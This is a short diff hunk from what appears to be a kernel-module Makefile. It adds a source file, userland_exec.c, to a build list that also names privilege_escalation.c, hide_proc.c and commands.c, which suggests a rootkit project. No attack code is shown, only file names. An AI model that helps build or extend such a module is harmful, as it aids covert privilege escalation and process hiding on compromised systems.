@@ -18,6 +18,7 @@ SRCS += kmod/src/privilege_escalation.c
 SRCS += kmod/src/hide_proc.c
 SRCS += kmod/src/commands.c
 SRCS += kmod/src/ketopt.c
+SRCS += kmod/src/userland_exec.c
 
 OBJS := $(SRCS:.c=.o)
 
